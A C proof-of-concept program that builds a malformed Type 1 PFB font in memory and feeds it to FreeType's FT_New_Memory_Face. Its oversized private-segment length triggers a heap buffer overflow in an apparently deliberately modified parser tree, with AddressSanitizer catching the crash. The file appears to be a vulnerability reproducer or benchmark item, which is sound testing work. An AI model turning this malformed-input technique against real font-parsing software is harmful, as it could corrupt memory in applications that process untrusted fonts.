/*
 * Proof-of-concept driver for a heap buffer overflow in the Type 1 PFB
 * private-dictionary reader (src/type1/t1parse.c, T1_Get_Private_Dict).
 *
 * The PFB private dictionary is made of one or more binary segments
 * (tag 0x8002).  On the vulnerable tree the per-segment buffer growth is
 * sized from a 16-bit truncated copy of the segment length while the
 * subsequent stream read consumes the full 32-bit declared length.  A
 * single private segment whose declared length is just above 64 KiB (so
 * that the low 16 bits are tiny) therefore makes FreeType allocate a few
 * bytes yet copy ~64 KiB into them -> heap-buffer-overflow write.
 *
 * The program only uses the public FreeType API (FT_New_Memory_Face) with
 * an in-contract, self-contained PFB font image.  It is clean on the
 * original maintenance batch and aborts under AddressSanitizer on the
 * modified tree.
 */

#include <ft2build.h>
#include FT_FREETYPE_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


/* little-endian helpers */
static void
put_u32le( unsigned char*  p,
           unsigned long   v )
{
  p[0] = (unsigned char)( v & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 ) & 0xFF );
  p[2] = (unsigned char)( ( v >> 16 ) & 0xFF );
  p[3] = (unsigned char)( ( v >> 24 ) & 0xFF );
}


int
main( void )
{
  /* ASCII (text) segment -- must start with "%!PS-AdobeFont" and end  */
  /* with the `eexec' keyword so that the top-dictionary parse stops.  */
  static const char  ascii[] =
    "%!PS-AdobeFont-1.0: Probe 001.001\n"
    "/FontType 1 def\n"
    "/FontMatrix [0.001 0 0 0.001 0 0] def\n"
    " eexec\n";

  const unsigned long  ascii_len = (unsigned long)( sizeof ( ascii ) - 1 );

  /* Declared length of the binary private segment: just over 64 KiB so  */
  /* that its low 16 bits (0x0040 = 64) are far smaller than the real    */
  /* amount of data that follows.                                        */
  const unsigned long  seg_len = 0x00010040UL;   /* 65600 */

  const size_t  total =
      6 + ascii_len +          /* 0x8001 header + ascii body        */
      6 + seg_len +            /* 0x8002 header + binary body       */
      2;                       /* 0x8003 end-of-file marker         */

  unsigned char*  buf = (unsigned char*)malloc( total );
  size_t          off = 0;

  FT_Library  library;
  FT_Face     face;
  FT_Error    error;

  if ( !buf )
    return 2;

  /* segment 1: ASCII dictionary (tag 0x8001) */
  buf[off++] = 0x80;
  buf[off++] = 0x01;
  put_u32le( buf + off, ascii_len );
  off += 4;
  memcpy( buf + off, ascii, ascii_len );
  off += ascii_len;

  /* segment 2: binary private dictionary (tag 0x8002) */
  buf[off++] = 0x80;
  buf[off++] = 0x02;
  put_u32le( buf + off, seg_len );
  off += 4;
  memset( buf + off, 0x20, seg_len );   /* innocuous filler bytes */
  off += seg_len;

  /* segment 3: end-of-file marker (tag 0x8003) */
  buf[off++] = 0x80;
  buf[off++] = 0x03;

  if ( off != total )
  {
    fprintf( stderr, "internal size mismatch\n" );
    free( buf );
    return 2;
  }

  error = FT_Init_FreeType( &library );
  if ( error )
  {
    free( buf );
    return 2;
  }

  /* Drive the public API.  On the vulnerable tree the overflowing copy  */
  /* happens inside this call, before it returns.                        */
  error = FT_New_Memory_Face( library, buf, (FT_Long)total, 0, &face );

  if ( !error )
    FT_Done_Face( face );

  FT_Done_FreeType( library );
  free( buf );

  printf( "done (error = 0x%02x)\n", (unsigned)error );
  return 0;
}
